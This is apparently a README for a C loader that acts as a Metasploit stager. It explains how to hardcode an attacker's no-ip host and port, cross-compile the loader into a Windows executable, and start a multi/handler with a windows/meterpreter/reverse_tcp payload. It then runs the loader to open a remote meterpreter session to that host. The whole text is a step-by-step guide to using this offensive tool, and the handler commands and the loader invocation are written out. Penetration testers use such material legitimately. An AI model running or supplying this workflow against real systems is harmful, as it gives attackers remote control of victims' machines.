A quick stager client compatible with the Metasploit Framework

Reference:

1. http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
2. http://mail.metasploit.com/pipermail/framework/2012-September/008664.html

Use:

1. Start a multi/handler with your favorite windows reverse_tcp payload
2. Edit line 12 and 13 with credencias
unsigned char server[] = "yourNoip.no-ip.org";
unsigned char serverp[] = "YourPort";

How to compile:

Windows
. Donwload gcc-4.9-win32
1. gcc metasploit-loader.c -o metasploit-loader.exe -lws2_32

LINUX 
. apt-get install mingw32
1. i586-mingw32msvc-gcc metasploit-loader.c -o metasploit-loader.exe -lws2_32

ToDo:

1. 64-bit compatability (see message #2)
2. get a Windows build environment with make

How to use:
```
msf > use exploit/multi/handler 
msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf  exploit(handler) > set LPORT 31337
LPORT => 31337
msf  exploit(handler) > set LHOST 192.168.95.241
LHOST => 192.168.95.241
msf  exploit(handler) > exploit -j
```

loader.exe 192.168.95.241 31337
